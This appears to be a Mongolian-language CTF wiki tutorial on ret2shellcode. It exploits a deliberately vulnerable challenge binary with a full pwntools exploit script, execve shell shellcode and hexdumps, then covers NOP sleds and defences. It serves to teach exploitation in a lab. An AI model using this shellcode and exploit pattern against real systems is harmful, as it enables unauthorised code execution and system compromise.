---
title: ret2shellcode
description: NX унтраалттай binary-д stack overflow ашиглан өөрийн машин кодоо (shellcode) stack дээр байрлуулж, түүн рүү үсрэх арга.
---

**ret2shellcode** (return-to-shellcode) нь **stack overflow** ашиглан өөрийн бичсэн **машин код**-оо (**shellcode**)
программын санах ойд байрлуулаад, **буцах хаяг (return address)**-ийг түүн рүү чиглүүлэх арга юм.

[ret2text](../ret2text/)-д программ дотор бэлэн `win()` функц байсан. Энд ийм функц **байхгүй** — shell нээх кодыг
бид өөрсдөө payload дотроо авчирна. Ихэнх shellcode `/bin/sh` (shell) нээдэг тул ийм нэртэй болсон.

:::note[Суурь мэдлэг]
- [ret2text](../ret2text/) — stack overflow, offset олох, return address дарж бичих
- [Хамгаалалтууд](../../basics/protections/#nx) хуудасны NX ба ASLR хэсэг
- [Calling convention](../../basics/calling-convention/#syscall) хуудасны Syscall хэсэг — shellcode `execve` syscall дууддаг
:::

## Санаа

`gets()` шиг функц return address-ийг дарж бичих боломж олгодгийг ret2text-ээс мэдэж байгаа. Асуулт нь **хаашаа** үсрэх вэ.

Бидний оруулсан өгөгдөл өөрөө stack дээр, `buf` дотор хадгалагдаж байна. Хэрэв stack **ажиллагдах (executable)** бол
CPU энэ өгөгдлийг **код** болгон гүйцэтгэж чадна. Тиймээс:

1. `buf`-ийн эхэнд shellcode-оо бичнэ.
2. Return address хүртэлх үлдсэн зайг padding-аар дүүргэнэ.
3. Return address-ийг **`buf`-ийн хаягаар** дарна.

`vuln()` `ret` хийхэд CPU `buf` руу үсэрч, бидний shellcode-ийг гүйцэтгэнэ:

![Overflow хийсний дараах stack: дээрээс доош return address (buf-ийн хаяг), saved rbp (AAAAAAAA), padding (AAAA…), buf-ийн эхэнд shellcode. ret хийхэд CPU return address-аас shellcode руу үсэрнэ.](../../../../assets/pwn/ret2shellcode-stack.svg)

Payload:

```ansi
[35m[ shellcode ][0m[32m[ AAAA ... ][0m[33m[ saved rbp ][0m[1;31m[  buf-ийн хаяг  ][0m
[90m└──────── 264 байт (offset) ─────────┘└ return address ┘[0m
```

ret2text-тэй харьцуулахад хоёр шинэ асуудал гарна:

1. **Shellcode** — shell нээдэг машин кодыг хаанаас авах вэ?
2. **`buf`-ийн хаяг** — stack-ийн хаяг [ASLR](../../basics/protections/#aslr)-ийн улмаас ажиллах бүрт өөрчлөгддөг. Хаашаа үсрэхээ яаж мэдэх вэ?

**ret2shellcode** ажиллах нөхцөл:

| Хамгаалалт | Шаардлага | Яагаад |
|------------|-----------|--------|
| NX | **Байхгүй** | NX байвал stack ажиллагдахгүй тул shellcode руу үсрэнгүүт `SIGSEGV` болно |
| Stack canary | **Байхгүй** | Canary байвал overflow-ийг `ret`-ээс өмнө илрүүлээд программыг зогсооно |
| ASLR | Stack-ийн хаягийг **leak** хийсэн (эсвэл ASLR унтраалттай) | Shellcode хаана байгааг мэдэх хэрэгтэй |
| PIE | Хамаагүй | Бид программын кодыг биш, stack-ийг ашиглана |

## Бодлого

Бүх файл [`challenges/pwn/userland/ret2shellcode`](https://github.com/computer-communication-security-club/ctf-wiki/tree/main/challenges/pwn/userland/ret2shellcode) хавтсанд байна:

| Файл | Тайлбар |
|------|---------|
| [`main.c`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/userland/ret2shellcode/main.c) | Эх код |
| [`ret2shellcode`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/userland/ret2shellcode/ret2shellcode) | Бэлэн binary (Ubuntu 24.04 дээр compile хийсэн) |
| [`Dockerfile`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/userland/ret2shellcode/Dockerfile) | Challenge сервер (deploy) |
| [`Makefile`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/userland/ret2shellcode/Makefile) | `make run`, `make stop` |

:::tip
Бэлэн binary-г ашиглавал энэ хуудсан дээрх disassembly, offset таных яг ижил гарна.
Харин stack-ийн хаяг (`buf: 0x7ff...`) ASLR-ийн улмаас ажиллуулах бүрт өөр гарна — энэ нь хэвийн.
:::

Challenge-ийг сервер хэлбэрээр ажиллуулах (Docker хэрэгтэй):

```console
$ cd challenges/pwn/userland/ret2shellcode
$ make run      # localhost:1337 дээр асна
$ nc localhost 1337
buf: 0x7fffaab828b0
What is your name?
$ make stop     # зогсоох
```

Repo татахгүйгээр бэлэн image-ийг шууд ажиллуулж болно:

```console
$ docker run --rm -p 1337:1337 ghcr.io/computer-communication-security-club/pwn-ret2shellcode
```

:::caution[Spoiler]
Доорх хэсэгт бодолт байгаа. Эхлээд өөрөө оролдоод үзээрэй!
:::

## Шийдэл

### 1. Эх код

```c title="main.c"
#include <stdio.h>
#include <stdlib.h>

char *gets(char *s); // шинэ glibc-ийн header-аас gets() хасагдсан

void vuln(void) {
    char buf[256];
    printf("buf: %p\n", buf);
    puts("What is your name?");
    gets(buf);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("Bye!");
    return 0;
}
```

Гурван зүйл анхаарал татна:

- `gets(buf)` — ret2text-тэй адил урт шалгахгүй тул **stack overflow** байна. Энэ удаа `buf` 256 байт.
- `win()` гэх мэт shell нээдэг функц **байхгүй**, `system()` ч хаана ч дуудагдаагүй.
- `printf("buf: %p\n", buf)` — программ `buf`-ийн **хаягийг өөрөө хэвлэж** өгч байна. Санах ойн ийм мэдээлэл
  гадагш гарахыг **leak** гэнэ. Бодит программд ийм шууд хэвлэлт ховор ч format string гэх мэт өөр алдаагаар
  хаяг leak хийх нь түгээмэл.

Зорилго: shellcode-оо `buf`-д бичээд, `vuln()`-ийн return address-ийг leak хийсэн хаягаар дарж бичих.

### 2. Хамгаалалт шалгах

```console
$ checksec --file=ret2shellcode
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
```

ret2text-ээс ялгаатай нь `Stack: Executable`, `RWX: Has RWX segments` мөрүүд нэмэгдсэн — stack ажиллагдах боломжтой.
`NX unknown` гэж буруу харуулдаг шалтгааныг [Хамгаалалтууд](../../basics/protections/#nx) хуудсанд тайлбарласан.
`readelf`-ээр баталгаажуулъя:

```console
$ readelf -lW ret2shellcode | grep GNU_STACK
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RWE 0x10
```

`RWE` — Read, Write, **Execute**. Binary-г дараах флагуудаар compile хийсэн:

```console
$ gcc main.c -o ret2shellcode -fno-stack-protector -no-pie -z execstack
```

- `-fno-stack-protector` — canary-г унтраана
- `-z execstack` — stack-ийг ажиллагдах болгоно (NX-ийг унтраана)
- `-no-pie` — энэ бодлогод заавал биш (бид `.text`-ийн хаяг ашиглахгүй), гэхдээ disassembly дээрх хаяг тогтмол байхад тустай

:::note[Хуучин tutorial-ууд]
Олон хуучин жишээнд shellcode-ийг stack биш, `.bss` гэх мэт глобал хувьсагчид бичдэг. Хуучин kernel
`-z execstack`-тэй binary-д **бүх** уншигдах хуудсыг ажиллагдах болгодог байсан. Шинэ kernel (Linux 5.8+) дээр
64-bit программд зөвхөн **stack** л ажиллагдах болно — `.bss`, heap руу үсэрвэл `SIGSEGV`.
Эргэлзвэл pwndbg-ийн `vmmap`-аар `x` эрхийг шалгаарай.
:::

### 3. Offset олох

`vuln()`-ийг disassemble хийнэ:

```ansi {6-8,12,16-18}
[1;31mpwndbg>[0m disassemble vuln
Dump of assembler code for function [33mvuln[0m:
   [34m0x0000000000401196[0m <+0>:	[32mendbr64[0m
   [34m0x000000000040119a[0m <+4>:	[32mpush   [0m[31mrbp[0m
   [34m0x000000000040119b[0m <+5>:	[32mmov    [0m[31mrbp[0m,[31mrsp[0m
   [34m0x000000000040119e[0m <+8>:	[32msub    [0m[31mrsp[0m,[34m0x100[0m
   [34m0x00000000004011a5[0m <+15>:	[32mlea    [0m[31mrax[0m,[[31mrbp[0m[34m-[0m[34m0x100[0m]
   [34m0x00000000004011ac[0m <+22>:	[32mmov    [0m[31mrsi[0m,[31mrax[0m
   [34m0x00000000004011af[0m <+25>:	[32mlea    [0m[31mrax[0m,[[31mrip[0m+[34m0xe4e[0m][90m        # [0m[90m0x402004[0m
   [34m0x00000000004011b6[0m <+32>:	[32mmov    [0m[31mrdi[0m,[31mrax[0m
   [34m0x00000000004011b9[0m <+35>:	[32mmov    [0m[31meax[0m,[34m0x0[0m
   [34m0x00000000004011be[0m <+40>:	[32mcall   [0m[34m0x401080[0m <[33mprintf@plt[0m>
   [34m0x00000000004011c3[0m <+45>:	[32mlea    [0m[31mrax[0m,[[31mrip[0m+[34m0xe43[0m][90m        # [0m[90m0x40200d[0m
   [34m0x00000000004011ca[0m <+52>:	[32mmov    [0m[31mrdi[0m,[31mrax[0m
   [34m0x00000000004011cd[0m <+55>:	[32mcall   [0m[34m0x401070[0m <[33mputs@plt[0m>
   [34m0x00000000004011d2[0m <+60>:	[32mlea    [0m[31mrax[0m,[[31mrbp[0m[34m-[0m[34m0x100[0m]
   [34m0x00000000004011d9[0m <+67>:	[32mmov    [0m[31mrdi[0m,[31mrax[0m
   [34m0x00000000004011dc[0m <+70>:	[32mcall   [0m[34m0x401090[0m <[33mgets@plt[0m>
   [34m0x00000000004011e1[0m <+75>:	[32mnop[0m
   [34m0x00000000004011e2[0m <+76>:	[32mleave[0m
   [34m0x00000000004011e3[0m <+77>:	[32mret[0m
End of assembler dump.
```

- `sub rsp,0x100` — локал хувьсагчдад **0x100 (256)** байт зай гаргана.
- `lea rax,[rbp-0x100]` → `mov rsi,rax` → `call printf` — `printf`-ийн 2 дахь аргумент (`rsi`) нь `buf`.
  Программын хэвлэдэг хаяг яг `buf`-ийн хаяг гэдгийг баталж байна.
- `lea rax,[rbp-0x100]` → `mov rdi,rax` → `call gets` — `gets()` `buf`-д (**`rbp - 0x100`**) бичнэ.

[ret2text](../ret2text/#арга-1-assembly-аас-тооцоолох)-тэй ижил аргаар:

```
offset = (rbp + 8) − (rbp − 0x100) = 0x100 + 8 = 264
```

Cyclic pattern-ээр шалгая. Pattern-ийг файлд бичээд программд оролт болгон өгнө:

```ansi
[1;31mpwndbg>[0m !pwn cyclic 300 > pattern
[1;31mpwndbg>[0m r < pattern
buf: 0x7fffffffdd50
What is your name?

Program received signal [31mSIGSEGV[0m, Segmentation fault.
[31m0x00000000004011e3[0m in vuln ()
[1;31mpwndbg>[0m x/wx $rsp
[33m0x7fffffffde58[0m:	0x63616171
[1;31mpwndbg>[0m !pwn cyclic -l 0x63616171
264
```

Offset = **264**. Хоёр хаягийн зөрүүгээр ч гарна: программ унах үеийн `rsp` (return address-ийн байр) − `buf` =
`0x7fffffffde58 − 0x7fffffffdd50` = `0x108` = 264.

:::caution[gdb дотор хаяг тогтмол]
gdb ASLR-ийг унтраадаг тул дотор нь `buf` үргэлж `0x7fffffffd...` гэх мэт ижил хаягтай гарна (таных
environment-ээс хамаарч арай өөр байж болно). gdb-гүй ажиллуулахад огт өөр хаяг гарна — дараагийн алхмыг үз.
:::

### 4. Shellcode бэлдэх

**Shellcode** гэдэг нь санах ойн хаана ч байрласан ажиллах **жижиг машин код** юм. Бидэнд shell нээдэг код хэрэгтэй:

```c
execve("/bin/sh", ["sh", NULL], NULL);
```

Үүнийг [Calling convention](../../basics/calling-convention/#syscall) хуудсанд үзсэн шиг `rax = 59` (`SYS_execve`),
`rdi`, `rsi`, `rdx`-д аргументуудыг тавиад `syscall` заавраар дуудна. Гараар бичих шаардлагагүй — pwntools-ийн
**`shellcraft`** бэлэн assembly үүсгэж, **`asm()`** түүнийг байт болгоно:

```python
>>> context.arch = 'amd64'   # template дээр context.binary үүнийг тохируулна
>>> print(shellcraft.sh())
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```

- `rdi` — `"/bin///sh"` string-ийг stack дээр `push` хийгээд хаягийг нь авна. `///` нь string-ийг яг 8 байтад
  тааруулах заль — Linux олон `/`-ийг нэг гэж үздэг.
- `rsi` — `argv = ["sh", NULL]` массивыг мөн stack дээр угсарна.
- `rdx` — `envp = NULL`.
- `rax = 0x3b` (59) → `syscall`.

Shellcode **тогтмол хаяг огт ашигладаггүй** — хэрэгтэй бүх зүйлээ stack дээр `push` хийгээд хаягийг нь `rsp`-ээс
авдаг. Тиймээс санах ойн хаана ч байрласан ажиллана.

```python
>>> shellcode = asm(shellcraft.sh())
>>> len(shellcode)
48
>>> print(hexdump(shellcode))
00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
00000030
```

48 байт — 256 байтын `buf`-д хангалттай багтана.

:::tip[Бэлэн shellcode]
`shellcraft`-аас гадна бэлэн shellcode-ийн цуглуулга бий. [shell-storm.org/shellcode](https://shell-storm.org/shellcode/index.html)
дээр үйлдлийн систем, архитектураар (Linux x86-64, ARM гэх мэт) ангилсан олон shellcode байдаг. Тохирохыг нь сонгоод
байтуудыг нь payload-даа шууд хуулж ашиглаж болно.

Сонгохдоо архитектур нь binary-тай таарч байх ёстой (энд **x86-64 Linux**), `buf`-д багтах эсэх, оролт уншдаг
функцийн зогсдог байт (доорх bad characters) дотор нь байгаа эсэх.
:::

:::caution[Bad characters]
Оролт уншдаг функц тодорхой байт дээр **зогсдог**: `gets()` `\n` (`0x0a`) дээр, `strcpy()` `\x00` дээр,
`scanf("%s")` зай, tab, `\n` дээр. Shellcode эсвэл хаяг дотор ийм байт байвал payload дундаа тасарна.

`shellcraft.sh()`-д `\x00`, `\n` аль аль нь байхгүй. `push 0x1010101 ^ 0x6873` → `xor ..., 0x1010101` гэсэн
сонин хоёр мөр яг үүний төлөө — `"sh\x00"`-ийг `\x00` байтгүйгээр stack дээр үүсгэж байна.

Payload-оо илгээхээс өмнө `assert b'\n' not in payload` гэж шалгаж болно. Leak хийсэн хаяг дотор санамсаргүй
`0x0a` байт таарах нь ховор боловч тохиолдож болно — тэгвэл exploit-оо дахин ажиллуулаарай.
:::

### 5. Хаашаа үсрэх вэ: leak

Программыг хэд хэдэн удаа ажиллуулъя:

```console
$ echo hi | ./ret2shellcode
buf: 0x7fffaab828b0
What is your name?
Bye!
$ echo hi | ./ret2shellcode
buf: 0x7fff787865c0
What is your name?
Bye!
$ echo hi | ./ret2shellcode
buf: 0x7ffd92256f70
What is your name?
Bye!
```

`buf`-ийн хаяг ажиллуулах бүрт өөр — ASLR. gdb-ээс олсон `0x7fffffffdd50`-ийг payload-д шууд бичвэл gdb
дотор ажиллаад, remote дээр ажиллахгүй.

Харин программ хаягаа өөрөө хэвлэж байгаа тул payload илгээхээс **өмнө** тэр мөрийг уншаад ашиглана:

```python
io.recvuntil(b'buf: ')
buf = int(io.recvline(), 16)    # b'0x7fffaab828b0\n' → 0x7fffaab828b0
```

`int(..., 16)` нь `0x` угтвар болон төгсгөлийн `\n`-ийг өөрөө алгасна.

### 6. Exploit

`pwn template`-ээр бэлдэц үүсгэнэ ([pwntools](../../tools/pwntools/#pwn-template)):

```console
$ pwn template ./ret2shellcode --host localhost --port 1337 --quiet > exploit.py
$ chmod +x exploit.py
```

`# -- Exploit goes here --` хэсэгт payload-оо нэмнэ (тодруулсан мөрүүд):

```python title="exploit.py" ins={39,42-44,46,48-51,53}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './ret2shellcode')

host = args.HOST or 'localhost'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

offset = 264

io = start()
io.recvuntil(b'buf: ')
buf = int(io.recvline(), 16)            # leak: buf-ийн хаяг
log.success(f'buf: {hex(buf)}')

shellcode = asm(shellcraft.sh())        # execve("/bin///sh", ["sh"], NULL)

payload = flat(
    shellcode.ljust(offset, b'A'),      # shellcode + padding (buf + saved rbp)
    buf,                                # return address → shellcode
)

io.sendlineafter(b'name?\n', payload)
io.interactive()
```

Payload ингэж харагдана (`buf` = `0x7fffffffdd50` үед, `print(hexdump(payload))`):

```
00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
*
00000100  41 41 41 41  41 41 41 41  50 dd ff ff  ff 7f 00 00  │AAAA│AAAA│P···│····│
00000110
```

- `0x00`–`0x2f` — shellcode (48 байт)
- `0x30`–`0x107` — `A` padding (`buf`-ийн үлдсэн хэсэг + `saved rbp`)
- `0x108` (= 264) — return address: `buf`-ийн хаяг little-endian хэлбэрээр. Дээд 2 байт нь `\x00` боловч
  `gets()` `\x00` дээр зогсдоггүй тул асуудалгүй.

Эхлээд өөрийн машин дээр (`LOCAL`) туршина:

```console
$ ./exploit.py LOCAL
[+] buf: 0x7fffaf7c2900
[*] Switching to interactive mode
$ cat flag.txt
FLAG{ret2shellcode}
```

Сервер рүү скриптийг өөрчлөлгүй ажиллуулна:

```console
$ ./exploit.py                    # make run-аар асаасан localhost:1337
$ ./exploit.py HOST=ctf.example.com PORT=31337
```

:::note[Stack alignment хэрэггүй]
ret2text-д `system()` доторх `movaps`-аас болж нэмэлт `ret` gadget тавьсан. Shellcode libc-ийн функц дууддаггүй,
шууд `syscall` хийдэг тул stack 16 байтад тэгшлэгдсэн эсэх хамаагүй.
:::

### 7. gdb-ээр шалгах

Shellcode руу үнэхээр үсэрч байгааг харъя. Template-ийн `gdbscript`-ийг `vuln`-ийн `ret` заавар (`vuln+77`)
дээр зогсохоор өөрчилнө:

```python title="exploit.py"
gdbscript = '''
break *vuln+77
continue
'''.format(**locals())
```

`./exploit.py LOCAL GDB` ажиллуулна. Exploit-ийн terminal дээр:

```console
[+] buf: 0x7fff3e45ff50
```

gdb breakpoint дээр зогсоход:

```ansi
Breakpoint 1, [34m0x00000000004011e3[0m in [33mvuln[0m ()
[1;31mpwndbg>[0m x/gx $rsp
[33m0x7fff3e460058[0m:	0x00007fff3e45ff50
[1;31mpwndbg>[0m si
[1;31mpwndbg>[0m x/6i $rip
[1;32m=>[0m [33m0x7fff3e45ff50[0m:	[32mpush   [0m[34m0x68[0m
   [33m0x7fff3e45ff52[0m:	[32mmovabs [0m[31mrax[0m,[34m0x732f2f2f6e69622f[0m
   [33m0x7fff3e45ff5c[0m:	[32mpush   [0m[31mrax[0m
   [33m0x7fff3e45ff5d[0m:	[32mmov    [0m[31mrdi[0m,[31mrsp[0m
   [33m0x7fff3e45ff60[0m:	[32mpush   [0m[34m0x1016972[0m
   [33m0x7fff3e45ff65[0m:	[32mxor    [0mDWORD PTR [[31mrsp[0m],[34m0x1010101[0m
```

- `x/gx $rsp` — `ret` авах гэж буй хаяг яг exploit-ийн leak хийсэн `buf` (`0x7fff3e45ff50`). Энэ удаа ASLR
  асаалттай тул хаяг `0x7fffffffd...` биш.
- `si` хийсний дараа `rip` stack-ийн хаяг руу шилжсэн, тэнд бидний shellcode (`push 0x68`, `movabs rax,...`) байна.

`continue` хийвэл gdb `process ... is executing new program: /usr/bin/dash` гэж хэвлэнэ — `execve` амжилттай болж
программ shell-ээр солигдсон.

:::tip
Shellcode `push` хийх бүрт stack дээр бичдэг. `ret`-ийн дараа `rsp` = `buf + 272` тул push-ууд `buf`-ийн дээд
хэсэгт (padding дээр) бичигдэнэ — `buf`-ийн эхэнд байгаа shellcode-оос хол. Харин shellcode `rsp`-ийн яг доор
(жишээ нь return address-ийн өмнөхөн) байвал push-ууд shellcode-ийн өөрийнх нь сүүл хэсгийг дарж эвдэж болно.
Тиймээс shellcode-ийг `buf`-ийн эхэнд тавьж, `rsp`-ээс зай үлдээх нь найдвартай.
:::

## NOP sled

Энэ бодлогод хаяг яг тодорхой байсан. Гэхдээ хаягийг **ойролцоогоор** л мэддэг тохиолдол бий: leak байхгүй,
ASLR унтраалттай ч gdb болон жинхэнэ орчны environment variable өөр тул stack хэдэн арван байтаар зөрдөг гэх мэт.

Ийм үед shellcode-ийн өмнө олон **`nop`** (`0x90`) заавар тавина. `nop` юу ч хийдэггүй — CPU зүгээр л дараагийн
заавар руу шилжинэ. Return address sled-ийн **хаана ч** буусан CPU nop-уудаар "гулсаж" shellcode хүртэл хүрнэ:

```ansi
[90m[ nop nop nop ... nop nop ][0m[35m[ shellcode ][0m[32m[ AAAA ... ][0m[1;31m[ buf + 64 ][0m
[36m        ↑ ────────────────→[0m
[36m        энд буусан ч nop-ууд shellcode хүртэл гулгуулна[0m
```

```python
payload = flat(
    (asm('nop') * 128 + shellcode).ljust(offset, b'A'),
    buf + 64,                    # sled-ийн дунд хаа нэгтээ
)
```

Sled урт байх тусам хаягийн алдааг илүү "уучилна".

:::tip[Shellcode-ийг return address-ийн ард]
`buf` shellcode багтахааргүй жижиг бол shellcode-ийг return address-ийн **ард** тавьж болно. `ret`-ийн дараа
`rsp` яг тэр хэсгийг заадаг:

```python
payload = flat(
    b'A' * offset,
    buf + offset + 8,            # return address → яг ард нь байгаа shellcode
    shellcode,
)
```
:::

## Хамгаалалт

- **NX** (анхнаасаа идэвхтэй) — `-z execstack`-ийг хэзээ ч бүү ашигла. NX-тэй үед ижил payload `buf` руу
  үсрэнгүүт `SIGSEGV` болно. Иймээс орчин үеийн exploit shellcode-ийн оронд программд байгаа кодыг ашигладаг
  ([ret2text](../ret2text/), ROP, ret2libc).
- **Хаяг бүү хэвлэ** — `%p`-ээр stack-ийн хаяг хэвлэх нь ASLR-ийг хүчингүй болгоно.
- `gets()`-ийг **хэзээ ч** бүү ашигла — `fgets(buf, sizeof(buf), stdin)` ашигла.
- Stack canary (`-fstack-protector-strong`).

## Эх сурвалж

- [CTF Wiki — Basic ROP: ret2shellcode](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode)
- [ir0nstone — Shellcode](https://ir0nstone.gitbook.io/notes/binexp/stack/shellcode)
- [ir0nstone — NOPs](https://ir0nstone.gitbook.io/notes/binexp/stack/nops)
- [pwntools — shellcraft.amd64](https://docs.pwntools.com/en/stable/shellcraft/amd64.html)
